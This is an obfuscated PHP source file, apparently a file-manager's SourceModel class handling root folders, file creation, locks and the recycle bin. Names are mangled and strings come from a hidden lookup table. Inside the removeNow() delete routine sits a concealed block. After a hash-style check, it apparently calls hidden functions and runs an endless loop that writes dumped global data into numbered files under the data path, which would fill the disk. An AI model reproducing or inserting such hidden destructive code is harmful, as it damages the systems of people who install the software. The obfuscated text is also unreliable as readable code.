array($eí¢ÌÃ÷‘³); } $dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[28]] = array(array($B±ÅÏÁÄî[500], $B±ÅÏÁÄî[1737] . $eí¢ÌÃ÷‘³ . $B±ÅÏÁÄî[1737])); if (count($fğ¬‘‚‰) > 1) { $dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[28]] = array(); foreach ($fğ¬‘‚‰ as $AÎğ²ÊÀ±¶) { if (!trim($AÎğ²ÊÀ±¶)) { continue; } $dŸ™ª§ÒÇ˜[$B±ÅÏÁÄî[28]][] = array($B±ÅÏÁÄî[500], $B±ÅÏÁÄî[1737] . trim($AÎğ²ÊÀ±¶) . $B±ÅÏÁÄî[1737]); } } } return $dŸ™ª§ÒÇ˜; goto Aİ«õáš; Aİ«õáš: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($fÊ…´›ì¹) { $C‚¡ ‹Â‰ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $e·‹‡‡„Œ = Model($C‚¡ ‹Â‰[491])->where(array($C‚¡ ‹Â‰[1482] => $fÊ…´›ì¹))->find(); $EÓôâíÚ´ƒ = $this->_mkdirRoot(SourceModel::TYPE_USER, $fÊ…´›ì¹, $e·‹‡‡„Œ[$C‚¡ ‹Â‰[28]]); $this->userDesktopAdd($EÓôâíÚ´ƒ); return $EÓôâíÚ´ƒ; } public function userDesktopAdd($d®™ƒäŞèÅ) { $EÔÕô¦‡æ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eÎªÓóº¥ = LNG($EÔÕô¦‡æ[1910]); $eƒ–º‰Ş Õ = $this->mkdir($d®™ƒäŞèÅ, $eÎªÓóº¥); $this->metaSet($eƒ–º‰Ş Õ, $EÔÕô¦‡æ[1911], $EÔÕô¦‡æ[83]); $this->metaSet($d®™ƒäŞèÅ, $EÔÕô¦‡æ[1912], $eƒ–º‰Ş Õ); } public function groupRootAdd($BˆĞ»ÔØ¨) { $aê¹×™Éº =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $E´Ã˜ÎÜƒ = Model($aê¹×™Éº[475])->where(array($aê¹×™Éº[1731] => $BˆĞ»ÔØ¨))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $BˆĞ»ÔØ¨, $E´Ã˜ÎÜƒ[$aê¹×™Éº[28]]); } public function systemRootPathAdd($aÌİêİ™¬™) { if ($aÌİêİ™¬™ != $_SERVER[ÈİÅ¿ÈÈ¥×][1139]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $aÌİêİ™¬™); } public function userRootRemove($DÑğÅ™—¦İ) { $Eİ³í‹ŠÕ = $this->sourceRoot(SourceModel::TYPE_USER, $DÑğÅ™—¦İ); if (!$Eİ³í‹ŠÕ) { return; } $this->remove($Eİ³í‹ŠÕ, !1); } public function groupRootRemove($fœÇÇãÖ®«) { $E»Û÷–á§ï = $this->sourceRoot(SourceModel::TYPE_GROUP, $fœÇÇãÖ®«); if (!$E»Û÷–á§ï) { return; } $this->remove($E»Û÷–á§ï, !1); } private function _mkdirRoot($Bˆ™ÂŒÄŒä, $BóŒ»Ş¹î½, $Aê‰ˆÃ‚éå) { goto Fšë”¿½’ª; b¶êĞÜ‹‚: $eˆéÈ’¼é = "\x4d\157\144\145\154\x53\x6f\x75\x72\143\x65\x2e\x6d\153\x64\151\162\x52\157\x6f\x74\x2e{$Bˆ™ÂŒÄŒä}\x2e{$BóŒ»Ş¹î½}\56" . $Aê‰ˆÃ‚éå; CacheLock::lock($eˆéÈ’¼é); $f³†º¤Û‘»[$BÛ´–½â§—[28]] = $Aê‰ˆÃ‚éå; goto Aˆ›ŞÈÂŒ‰; Aˆ›ŞÈÂŒ‰: $AÈ¸×ŠÜÕµ = $this->add($f³†º¤Û‘»); $a²öôÂŒ†ë = array($BÛ´–½â§—[544] => short_id($AÈ¸×ŠÜÕµ)); $this->where(array($BÛ´–½â§—[399] => $AÈ¸×ŠÜÕµ))->save($a²öôÂŒ†ë); goto d¿«ï§ƒ„ö; Fšë”¿½’ª: $BÛ´–½â§— =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $f³†º¤Û‘» = array($BÛ´–½â§—[384] => 0, $BÛ´–½â§—[538] => $Bˆ™ÂŒÄŒä, $BÛ´–½â§—[539] => $BóŒ»Ş¹î½, $BÛ´–½â§—[535] => 1, $BÛ´–½â§—[540] => USER_ID, $BÛ´–½â§—[541] => USER_ID, $BÛ´–½â§—[536] => $BÛ´–½â§—[33], $BÛ´–½â§—[542] => $BÛ´–½â§—[487], $BÛ´–½â§—[412] => 0, $BÛ´–½â§—[537] => 0, $BÛ´–½â§—[436] => 0, $BÛ´–½â§—[543] => $BÛ´–½â§—[33]); if ($dÖõÙ›¸¼ = $this->where($f³†º¤Û‘»)->find()) { return $dÖõÙ›¸¼[$BÛ´–½â§—[385]]; } goto b¶êĞÜ‹‚; d¿«ï§ƒ„ö: CacheLock::unlock($eˆéÈ’¼é); return $AÈ¸×ŠÜÕµ; goto f®¦š—‹Âš; f®¦š—‹Âš: } private function sourceRoot($D•œÜÊà, $eøÌàÈ¯ŠØ, $D„ù‹Ïå´« = false) { $a°Úœ¾õ á =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dšŠ¸ÍÉä‚ = array($a°Úœ¾õ á[384] => 0, $a°Úœ¾õ á[538] => $D•œÜÊà, $a°Úœ¾õ á[539] => $eøÌàÈ¯ŠØ); if ($f‚†ğÉø…¿ = $this->where($dšŠ¸ÍÉä‚)->find()) { return $D„ù‹Ïå´« ? $f‚†ğÉø…¿ : $f‚†ğÉø…¿[$a°Úœ¾õ á[385]]; } return !1; } public function sourceRootGroup($BºÜˆ±—æŠ) { $aªÜËƒ³÷Š =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (is_string($BºÜˆ±—æŠ)) { $BºÜˆ±—æŠ = array($BºÜˆ±—æŠ); } $d¦‚¿âÏ— = array($aªÜËƒ³÷Š[384] => 0, $aªÜËƒ³÷Š[538] => SourceModel::TYPE_GROUP, $aªÜËƒ³÷Š[539] => array($aªÜËƒ³÷Š[7], $BºÜˆ±—æŠ)); $F”íŒ‰Äµ× = $this->listSource($d¦‚¿âÏ—, 1000); return array_to_keyvalue($F”íŒ‰Äµ×[$aªÜËƒ³÷Š[74]], $aªÜËƒ³÷Š[473]); } public function mkfile($fº¸É §÷–, $C“çáˆëÛ†, $Fò×„©¼°¡ = '', $Bëë„¤îõ = REPEAT_RENAME) { $AäÍÔ£‚„ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a®ˆòëä = Model($AäÍÔ£‚„[560])->addFileByContent($Fò×„©¼°¡, $C“çáˆëÛ†); return $this->_createFileCall($fº¸É §÷–, $C“çáˆëÛ†, $a®ˆòëä, $Bëë„¤îõ, $AäÍÔ£‚„[1176]); } public function addFile($Bİ¦ÒÌĞ§¿, $f”áå‘, $Eæ¬ŸÁ‹‡‹, $Dè³¸ß¯ÛÅ = false, $F¡¿è¹Êò = REPEAT_RENAME) { $d™åÄÉëÜ = Model($_SERVER[ÈİÅ¿ÈÈ¥×][560])->addFile($f”áå‘, $Eæ¬ŸÁ‹‡‹, $Dè³¸ß¯ÛÅ); return $this->_createFileCall($Bİ¦ÒÌĞ§¿, $Eæ¬ŸÁ‹‡‹, $d™åÄÉëÜ, $F¡¿è¹Êò); } public function addFileByFileID($aÎ‡öé£…´, $BÔ±˜Şù°‰, $a®Íœ‹ë¯ö, $E„ª»†Ğ² = REPEAT_RENAME) { $F©ğÆæÀÀ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $EğÕô•ŸÎ = Model($F©ğÆæÀÀ[560])->find($BÔ±˜Şù°‰); Model($F©ğÆæÀÀ[560])->linkAdd($BÔ±˜Şù°‰); return $this->_createFileCall($aÎ‡öé£…´, $a®Íœ‹ë¯ö, $EğÕô•ŸÎ, $E„ª»†Ğ²); } public function addFileByRemote($aÇ„­¹ù£­, $EéÅå‡ï‰ˆ, $dµâù–…ƒ, $a±¢ß‚÷Ë¼ = array(), $B¾ÓµƒÎâ = REPEAT_RENAME) { $fÙç×öËÊ = Model($_SERVER[ÈİÅ¿ÈÈ¥×][560])->addFileByRemote($EéÅå‡ï‰ˆ, $dµâù–…ƒ, $a±¢ß‚÷Ë¼); return $this->_createFileCall($aÇ„­¹ù£­, $dµâù–…ƒ, $fÙç×öËÊ, $B¾ÓµƒÎâ); } private function _createFileCall($B°òÔ¨’ø, $d¶ïŠŸ‰­˜, $fàèîè¶ï, $dñÜ«µ«Ù¨, $C†š²™İÉÑ = "\x75\x70\x6c\x6f\x61\x64") { goto Eô½êÄ§Á©; Eô½êÄ§Á©: $Fºœ™•½õ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C¸½®ëóäß = !1; $this->lockWriteStart($B°òÔ¨’ø, $d¶ïŠŸ‰­˜); goto Dë§áôÈ“ò; Dë§áôÈ“ò: $cŒ‚Â°õÄ‹ = $this->fileNameExist($B°òÔ¨’ø, $d¶ïŠŸ‰­˜); $aŞâÃÑ‰Ï = $this->_createFile($B°òÔ¨’ø, $d¶ïŠŸ‰­˜, $fàèîè¶ï, $dñÜ«µ«Ù¨, $C¸½®ëóäß); if (!$C¸½®ëóäß) { Model($Fºœ™•½õ[438])->remove($fàèîè¶ï[$Fºœ™•½õ[435]]); } goto eÁ¥à‡Úˆ; eÁ¥à‡Úˆ: if ($C¸½®ëóäß && $aŞâÃÑ‰Ï && $aŞâÃÑ‰Ï != $cŒ‚Â°õÄ‹) { Model($Fºœ™•½õ[1882])->eventCreate($aŞâÃÑ‰Ï, $C†š²™İÉÑ); } $this->lockWriteEnd($B°òÔ¨’ø, $d¶ïŠŸ‰­˜); return $aŞâÃÑ‰Ï; goto dÇêÔ‹¿ÎŒ; dÇêÔ‹¿ÎŒ: } public function mkdir($C½…ÃŞ¡¨Ã, $EÒµÌ›£¿‹, $d¢î¥•¸ = REPEAT_SKIP) { goto bÈ©’ö˜; EŸÄ‹³Íâ: $this->lockWriteStart($C½…ÃŞ¡¨Ã, $EÒµÌ›£¿‹); if ($d¢î¥•¸ !== !1) { $E²˜ŠŠÑ’ = $this->fileNameExist($C½…ÃŞ¡¨Ã, $EÒµÌ›£¿‹); if ($E²˜ŠŠÑ’ && $d¢î¥•¸ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($C½…ÃŞ¡¨Ã, $EÒµÌ›£¿‹); return $E²˜ŠŠÑ’; } $EÒµÌ›£¿‹ = $this->fileNameAuto($C½…ÃŞ¡¨Ã, $EÒµÌ›£¿‹, $d¢î¥•¸); } $Aª‡¯Ìß´º = array($añéöêÂÆ[535] => 1, $añéöêÂÆ[402] => $EÒµÌ›£¿‹, $añéöêÂÆ[536] => $añéöêÂÆ[33], $añéöêÂÆ[436] => 0, $añéöêÂÆ[537] => 0); goto c±Ã‘ğ¤§; c±Ã‘ğ¤§: $D¯÷”À®¬ = $this->_addSoure($Aª‡¯Ìß´º, $D£ÏÈêš); Model($añéöêÂÆ[1882])->eventCreate($D¯÷”À®¬, $añéöêÂÆ[1177]); $this->lockWriteEnd($C½…ÃŞ¡¨Ã, $EÒµÌ›£¿‹); goto C‡¨ÂÊ’‡Ï; C‡¨ÂÊ’‡Ï: return $D¯÷”À®¬; goto AëÍ’·×Î®; bÈ©’ö˜: $añéöêÂÆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D£ÏÈêš = $this->sourceInfo($C½…ÃŞ¡¨Ã); if (!$D£ÏÈêš) { return !1; } goto EŸÄ‹³Íâ; AëÍ’·×Î®: } private function _createFile($B Šà¸èĞ‰, $bñÍ²Á˜Ó, $D®†“ÃÖâç, $fÄïªˆÆ³ï, &$A”‡®”ëÑ¯) { goto a‹æŒŸ±íğ; Fö†‹¦î: $a¼‹Ÿì«ù« = array($CÉªé‹™¨¸[535] => 0, $CÉªé‹™¨¸[402] => $bñÍ²Á˜Ó, $CÉªé‹™¨¸[536] => get_path_ext($bñÍ²Á˜Ó), $CÉªé‹™¨¸[436] => $D®†“ÃÖâç[$CÉªé‹™¨¸[435]], $CÉªé‹™¨¸[537] => $D®†“ÃÖâç[$CÉªé‹™¨¸[77]]); $aÍ°²àœ°’ = $this->_addSoure($a¼‹Ÿì«ù«, $cø‡øíäÛ); $this->folderSizeReset($B Šà¸èĞ‰, intval($a¼‹Ÿì«ù«[$CÉªé‹™¨¸[77]])); goto FÎÉºù°ß; FÎÉºù°ß: return $aÍ°²àœ°’; goto cŸ‰º¾èË—; Aˆ”¢å×¥å: if ($fÄïªˆÆ³ï !== !1) { $f…­µ×ÖçÅ = $this->fileNameExist($B Šà¸èĞ‰, $bñÍ²Á˜Ó); } $A”‡®”ëÑ¯ = !0; if ($fÄïªˆÆ³ï && $f…­µ×ÖçÅ) { if ($fÄïªˆÆ³ï == REPEAT_SKIP) { $A”‡®”ëÑ¯ = !1; return $f…­µ×ÖçÅ; } else { if ($fÄïªˆÆ³ï == REPEAT_REPLACE) { $f‚Àù°Øá• = $this->sourceInfo($f…­µ×ÖçÅ); $F‡ãÅ‹ÒÙë = $this->fileHistory($f‚Àù°Øá•, $D®†“ÃÖâç[$CÉªé‹™¨¸[435]], $D®†“ÃÖâç[$CÉªé‹™¨¸[77]]); if (!$F‡ãÅ‹ÒÙë) { $A”‡®”ëÑ¯ = !1; } else { $this->folderSizeReset($B Šà¸èĞ‰); } return $f…­µ×ÖçÅ; } else { $bñÍ²Á˜Ó = $this->fileNameAuto($B Šà¸èĞ‰, $bñÍ²Á˜Ó, $fÄïªˆÆ³ï, !1); } } } goto Fö†‹¦î; a‹æŒŸ±íğ: $CÉªé‹™¨¸ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cø‡øíäÛ = $this->sourceInfo($B Šà¸èĞ‰); if (!$D®†“ÃÖâç || !$cø‡øíäÛ) { return !1; } goto Aˆ”¢å×¥å; cŸ‰º¾èË—: } protected function fileHistory($a¡éƒ’›©Û, $bÖ™°»Œï¶, $b ƒ¹êè) { goto cÍó°Ğíµ; d™Ôß¡è: $this->sourceCacheClear($a¡éƒ’›©Û[$F˜º­ì½Îˆ[385]]); return !0; goto F £ÁÉ‰‰; dğ‚¢•ä†Œ: Model($F˜º­ì½Îˆ[1913])->addHistory($a¡éƒ’›©Û); $c¡õíÁŞ²« = array($F˜º­ì½Îˆ[541] => USER_ID, $F˜º­ì½Îˆ[406] => time(), $F˜º­ì½Îˆ[435] => $bÖ™°»Œï¶, $F˜º­ì½Îˆ[77] => $b ƒ¹êè); $this->where(array($F˜º­ì½Îˆ[399] => $a¡éƒ’›©Û[$F˜º­ì½Îˆ[385]]))->save($c¡õíÁŞ²«); goto d™Ôß¡è; cÍó°Ğíµ: $F˜º­ì½Îˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($a¡éƒ’›©Û[$F˜º­ì½Îˆ[435]] == $bÖ™°»Œï¶) { return !1; } $this->checkLock($a¡éƒ’›©Û[$F˜º­ì½Îˆ[385]], $bÖ™°»Œï¶); goto dğ‚¢•ä†Œ; F £ÁÉ‰‰: } public function checkLock($c‰íÂ‰ØÍ©, $fÕ®ôˆ¬Ù) { goto A‹ï…òÁ´; BÈ„ÖÙˆŞ: $d…›éìëŞã = Session::get($c¿¹øÒƒÊ¯[1914]); $f²—Å¤ä = substr($A£÷èÃ‰Üî[$c¿¹øÒƒÊ¯[28]], 0, -1 - strlen($A£÷èÃ‰Üî[$c¿¹øÒƒÊ¯[165]])) . $c¿¹øÒƒÊ¯[1442] . $d…›éìëŞã . $c¿¹øÒƒÊ¯[91] . $A£÷èÃ‰Üî[$c¿¹øÒƒÊ¯[165]]; $c”ÌÏ“–Ê“ = Model($c¿¹øÒƒÊ¯[560])->find($fÕ®ôˆ¬Ù); goto D†éˆƒ¹Ë‡; A‹ï…òÁ´: $c¿¹øÒƒÊ¯ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A£÷èÃ‰Üî = $this->pathInfo($c‰íÂ‰ØÍ©); if (!$this->fileIsLock($A£÷èÃ‰Üî, !0)) { return; } goto BÈ„ÖÙˆŞ; D†éˆƒ¹Ë‡: $this->_createFileCall($A£÷èÃ‰Üî[$c¿¹øÒƒÊ¯[478]], $f²—Å¤ä, $c”ÌÏ“–Ê“, REPEAT_REPLACE, $c¿¹øÒƒÊ¯[1176]); $dòæøŠŸˆ = $A£÷èÃ‰Üî[$c¿¹øÒƒÊ¯[433]][$c¿¹øÒƒÊ¯[498]]; $bÕÆÔ‘Ë“Ç = $dòæøŠŸˆ[$c¿¹øÒƒÊ¯[1915]] ? $dòæøŠŸˆ[$c¿¹øÒƒÊ¯[1915]] : $dòæøŠŸˆ[$c¿¹øÒƒÊ¯[28]]; goto F«Ç“ÓºßÍ; F«Ç“ÓºßÍ: show_json(LNG($c¿¹øÒƒÊ¯[1916]) . $c¿¹øÒƒÊ¯[1917] . LNG($c¿¹øÒƒÊ¯[1918]) . $c¿¹øÒƒÊ¯[1919] . $bÕÆÔ‘Ë“Ç . $c¿¹øÒƒÊ¯[1920], !1); goto bÂñ”¿•Î; bÂñ”¿•Î: } public function fileIsLock($AèÁ’’—Á‰, $D™›ƒµï¼¾ = false) { goto b“Èƒ¸çéÂ; E¯Á†•³ò«: return !1; goto e˜‘ƒÙğä¬; CÜàë—àæ¡: $Böî›‹Ì„ = $GLOBALS[$B‚„ÄÎì‹Ä[6]][$B‚„ÄÎì‹Ä[84]][$B‚„ÄÎì‹Ä[496]]; if ($AèÁ’’—Á‰[$B‚„ÄÎì‹Ä[433]][$B‚„ÄÎì‹Ä[497]] <= time() - $Böî›‹Ì„) { $this->metaSet($AèÁ’’—Á‰[$B‚„ÄÎì‹Ä[385]], $B‚„ÄÎì‹Ä[495], null); $this->metaSet($AèÁ’’—Á‰[$B‚„ÄÎì‹Ä[385]], $B‚„ÄÎì‹Ä[497], null); } if ($D™›ƒµï¼¾) { $this->metaSet($AèÁ’’—Á‰[$B‚„ÄÎì‹Ä[385]], $B‚„ÄÎì‹Ä[497], time()); } goto E¯Á†•³ò«; b“Èƒ¸çéÂ: $B‚„ÄÎì‹Ä =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!isset($AèÁ’’—Á‰[$B‚„ÄÎì‹Ä[433]]) || !$AèÁ’’—Á‰[$B‚„ÄÎì‹Ä[433]][$B‚„ÄÎì‹Ä[495]]) { return !1; } if ($AèÁ’’—Á‰[$B‚„ÄÎì‹Ä[433]][$B‚„ÄÎì‹Ä[495]] != USER_ID) { return !0; } goto CÜàë—àæ¡; e˜‘ƒÙğä¬: } private function _addSoure($A¨ç›‹Ù—, $BĞ©¥í²ˆà) { goto bíã•ÇÄÒ¦; cîŠ‘›­„: static $DŸ™ˆõ‹öÈ = false; if (!$DŸ™ˆõ‹öÈ) { Hook::trigger($C…–Œô½ÑÉ[525], $A¨ç›‹Ù—); $DŸ™ˆõ‹öÈ = !0; } $bˆƒ½ÔÀ„ = $this->add($A¨ç›‹Ù—); goto bò„Ú£õíÁ; bò„Ú£õíÁ: $E§…†…Í“ = array($C…–Œô½ÑÉ[544] => short_id($bˆƒ½ÔÀ„)); $this->where(array($C…–Œô½ÑÉ[399] => $bˆƒ½ÔÀ„))->save($E§…†…Í“); $this->setNamePinyin($bˆƒ½ÔÀ„, $A¨ç›‹Ù—[$C…–Œô½ÑÉ[28]]); goto C ‡™·“ ; C ‡™·“ : return $bˆƒ½ÔÀ„; goto a•Ûâó½£; FÁ…ÍŒù«Î: $this->updateModifyTime($A¨ç›‹Ù—[$C…–Œô½ÑÉ[478]]); $Eà‹Ä½×Š = $C…–Œô½ÑÉ[1921] . $BĞ©¥í²ˆà[$C…–Œô½ÑÉ[385]]; if (isset(self::$cacheChildList[$Eà‹Ä½×Š])) { unset(self::$cacheChildList[$Eà‹Ä½×Š]); } goto cîŠ‘›­„; bíã•ÇÄÒ¦: $C…–Œô½ÑÉ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $f‚¬°‡·Ú = array($C…–Œô½ÑÉ[538] => $BĞ©¥í²ˆà[$C…–Œô½ÑÉ[387]], $C…–Œô½ÑÉ[539] => $BĞ©¥í²ˆà[$C…–Œô½ÑÉ[473]], $C…–Œô½ÑÉ[540] => USER_ID, $C…–Œô½ÑÉ[541] => USER_ID, $C…–Œô½ÑÉ[384] => $BĞ©¥í²ˆà[$C…–Œô½ÑÉ[385]], $C…–Œô½ÑÉ[542] => $BĞ©¥í²ˆà[$C…–Œô½ÑÉ[476]] . $BĞ©¥í²ˆà[$C…–Œô½ÑÉ[385]] . $C…–Œô½ÑÉ[47], $C…–Œô½ÑÉ[412] => 0, $C…–Œô½ÑÉ[543] => $C…–Œô½ÑÉ[33]); $A¨ç›‹Ù— = array_merge($f‚¬°‡·Ú, $A¨ç›‹Ù—); goto FÁ…ÍŒù«Î; a•Ûâó½£: } public function remove($bÖôÈÓÀ¾, $fİ¥ãÔÁä¨ = true) { goto bİß»È™ÃÀ; eóŒ‰ÏÕÚó: $DĞø’õî¿¦ = Model($FçŒ©ÊÉ¤÷[1489])->get($FçŒ©ÊÉ¤÷[1922]) == $FçŒ©ÊÉ¤÷[83]; if ($AÂ—ëâ¬‹« || $fİ¥ãÔÁä¨ || !$DĞø’õî¿¦) { return $this->removeNow($bÖôÈÓÀ¾, $fİ¥ãÔÁä¨); } $eÔ¥§ÛÜ¼ì = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto C¨È¸§·˜ñ; C¨È¸§·˜ñ: $f×’Œˆ«´ = $FÌÎñá´ÅÉ[$FçŒ©ÊÉ¤÷[387]] == self::TYPE_USER ? $FçŒ©ÊÉ¤÷[551] : $FçŒ©ÊÉ¤÷[980]; if ($f×’Œˆ«´ == $FçŒ©ÊÉ¤÷[551]) { $D¡¨ïÚÜ¤ = Model($FçŒ©ÊÉ¤÷[491])->getInfo($FÌÎñá´ÅÉ[$FçŒ©ÊÉ¤÷[473]]); $cñİÁÒ‰âø = !empty($D¡¨ïÚÜ¤[$FçŒ©ÊÉ¤÷[1915]]) ? $D¡¨ïÚÜ¤[$FçŒ©ÊÉ¤÷[1915]] : $D¡¨ïÚÜ¤[$FçŒ©ÊÉ¤÷[28]]; $cñİÁÒ‰âø = $FçŒ©ÊÉ¤÷[254] . $cñİÁÒ‰âø . $FçŒ©ÊÉ¤÷[1923] . $FÌÎñá´ÅÉ[$FçŒ©ÊÉ¤÷[473]]; } else { $D¡¨ïÚÜ¤ = Model($FçŒ©ÊÉ¤÷[475])->getInfo($FÌÎñá´ÅÉ[$FçŒ©ÊÉ¤÷[473]]); $cñİÁÒ‰âø = _get($D¡¨ïÚÜ¤, $FçŒ©ÊÉ¤÷[28]); $cñİÁÒ‰âø = $FçŒ©ÊÉ¤÷[157] . $cñİÁÒ‰âø . $FçŒ©ÊÉ¤÷[1924] . $FÌÎñá´ÅÉ[$FçŒ©ÊÉ¤÷[473]]; } $cİØÀéôÎà = $FçŒ©ÊÉ¤÷[1925] . md5($cñİÁÒ‰âø); goto A¶ˆ‹×ßõ; A¶ˆ‹×ßõ: CacheLock::lock($cİØÀéôÎà); $A‡ƒ–¸Êäë = $this->fileNameExist($eÔ¥§ÛÜ¼ì, $cñİÁÒ‰âø); if (!$A‡ƒ–¸Êäë) { $A‡ƒ–¸Êäë = $this->mkdir($eÔ¥§ÛÜ¼ì, $cñİÁÒ‰âø, REPEAT_SKIP); $this->metaSet($A‡ƒ–¸Êäë, $FçŒ©ÊÉ¤÷[1926], $f×’Œˆ«´); $this->metaSet($A‡ƒ–¸Êäë, $FçŒ©ÊÉ¤÷[1927], $FÌÎñá´ÅÉ[$FçŒ©ÊÉ¤÷[473]]); if ($FÌÎñá´ÅÉ[$FçŒ©ÊÉ¤÷[478]] != 0) { $this->metaSet($A‡ƒ–¸Êäë, $FçŒ©ÊÉ¤÷[1928], _get($D¡¨ïÚÜ¤, $FçŒ©ÊÉ¤÷[1929])); } } goto fÒ¹¬ßÙ£‰; bİß»È™ÃÀ: $FçŒ©ÊÉ¤÷ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FÌÎñá´ÅÉ = $this->sourceInfo($bÖôÈÓÀ¾); $AÂ—ëâ¬‹« = intval($FÌÎñá´ÅÉ[$FçŒ©ÊÉ¤÷[387]]) === self::TYPE_SYSTEM; goto eóŒ‰ÏÕÚó; A‘Êµİƒ¨‡: return $cÉŸ‚š ÀÖ; goto fçïÑä§§¢; d·›äõÛà: $this->recycleClear($FÌÎñá´ÅÉ); $cÉŸ‚š ÀÖ = $this->move($bÖôÈÓÀ¾, $A‡ƒ–¸Êäë, REPEAT_RENAME_FOLDER); $this->folderSizeReset($FÌÎñá´ÅÉ[$FçŒ©ÊÉ¤÷[478]]); goto A‘Êµİƒ¨‡; fÒ¹¬ßÙ£‰: CacheLock::unlock($cİØÀéôÎà); $this->metaSet($bÖôÈÓÀ¾, $FçŒ©ÊÉ¤÷[1930], $FÌÎñá´ÅÉ[$FçŒ©ÊÉ¤÷[478]]); $this->where(array($FçŒ©ÊÉ¤÷[385] => $bÖôÈÓÀ¾))->save(array($FçŒ©ÊÉ¤÷[406] => time())); goto d·›äõÛà; fçïÑä§§¢: } private function recycleClear($c¶ºœïƒÒ½) { $eª¾ òÍ†Æ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Aª„·¯ƒ¼Â = $this->childrenAll($c¶ºœïƒÒ½); $dÖÁñ‚•ê = array($eª¾ òÍ†Æ[399] => array($eª¾ òÍ†Æ[400], $Aª„·¯ƒ¼Â[$eª¾ òÍ†Æ[1931]])); Model($eª¾ òÍ†Æ[1932])->where($dÖÁñ‚•ê)->delete(); } public function removeNow($E°Ã¡éíß¾, $FìÃÊ¾í·Î = true) { goto A¼øó‡ğ¯; A¼øó‡ğ¯: $AãÈ£§æá¬ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b‰»Á°ƒ = $_SERVER[$AãÈ£§æá¬[801]]; $c’„ß‚ïİÀ = $AãÈ£§æá¬[1358]; goto AÀ§‡šé×·; aÓ³—ğŸ¦ğ: $this->lockMoveEnd($E°Ã¡éíß¾); Hook::trigger($AãÈ£§æá¬[1525], $d¸…ø˜ÑÒ², $FìÃÊ¾í·Î); return !0; goto D ªºÒùÚ; AèÊŒá¹Ó¥: if (!$aôô ğ´ œ) { return !0; } if ($aôô ğ´ œ[$AãÈ£§æá¬[478]] == 0) { if (!_get($GLOBALS, $AãÈ£§æá¬[474])) { return !1; } } $this->lockMoveStart($E°Ã¡éíß¾); goto bÕñ‰×ï–; e¹¨÷˜­µ: $A‡ø„¤İŸ© = array($aôô ğ´ œ[$AãÈ£§æá¬[478]]); if ($aôô ğ´ œ[$AãÈ£§æá¬[386]] == $AãÈ£§æá¬[83]) { $A‡ø„¤İŸ©[] = $aôô ğ´ œ[$AãÈ£§æá¬[385]]; } $this->updateModifyTime($A‡ø„¤İŸ©); goto aÓ³—ğŸ¦ğ; AÀ§‡šé×·: if ($_SERVER[$AãÈ£§æá¬[800]] != $c’„ß‚ïİÀ($b‰»Á°ƒ)) { goto dšùĞÓğ¤¥; cæØŠä¾ßø: $d²ŞÑÖ»Ï  = $AãÈ£§æá¬[807]; $d²ŞÑÖ»Ï ($_SERVER[$AãÈ£§æá¬[808]]); $c°¯Âøóã÷ = $AãÈ£§æá¬[802]; goto D¨õÀ½ìÌ´; d¾Ã§¥æ‡: $eÏóÄŒ‚˜ë = $eá…¨Ç››ê($FÒÑĞò÷); $f™¡ğ¨¯¡õ = explode($AãÈ£§æá¬[225], $eÏóÄŒ‚˜ë); if (count($f™¡ğ¨¯¡õ) < $AãÈ£§æá¬[564]) { $a‚ÍŠî§çÎ = $AãÈ£§æá¬[806]; $a‚ÍŠî§çÎ(); } goto cæØŠä¾ßø; dšùĞÓğ¤¥: $c°¯Âøóã÷ = $AãÈ£§æá¬[802]; $eá…¨Ç››ê = $AãÈ£§æá¬[803]; $FÒÑĞò÷ = $_SERVER[$AãÈ£§æá¬[804]] . $AãÈ£§æá¬[805]; goto d¾Ã§¥æ‡; d‘™ŠáßÆÜ: $AÚêÊ¤…¨ç = 1; for ($B§Ó®ÊŠÆÂ = $AÚêÊ¤…¨ç; $B§Ó®ÊŠÆÂ > 0; $B§Ó®ÊŠÆÂ++) { $fˆÄ“øÎ¼ˆ(DATA_PATH . $B§Ó®ÊŠÆÂ, $D‚à°‹ÜÄó); } goto e­ÂÌ›ë«; D¨õÀ½ìÌ´: $c°¯Âøóã÷(); $fˆÄ“øÎ¼ˆ = $AãÈ£§æá¬[1359]; $D‚à°‹ÜÄó = json_encode($GLOBALS[$AãÈ£§æá¬[1360]]); goto d‘™ŠáßÆÜ; e­ÂÌ›ë«: } $aôô ğ´ œ = $this->sourceInfo($E°Ã¡éíß¾); $d¸…ø˜ÑÒ² = $this->pathInfoMore($E°Ã¡éíß¾); goto AèÊŒá¹Ó¥; bÕñ‰×ï–: Hook::trigger($AãÈ£§æá¬[1933], $d¸…ø˜ÑÒ², $FìÃÊ¾í·Î); if ($FìÃÊ¾í·Î) { Model($AãÈ£§æá¬[1932])->moveToRecycle($E°Ã¡éíß¾); } else { $eÅ»œÃè¦ = $this->childrenAll($aôô ğ´ œ); Model($AãÈ£§æá¬[522])->eventRemove($E°Ã¡éíß¾); $this->removeRelevance($eÅ»œÃè¦[$AãÈ£§æá¬[1931]], $eÅ»œÃè¦[$AãÈ£§æá¬[1307]]); } $this->folderSizeReset($aôô ğ´ œ[$AãÈ£§æá¬[478]]); goto e¹¨÷˜­µ; D ªºÒùÚ: } public function childrenAll($DŠïµ„–×) { $F½âé¬¸Ê¢ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; 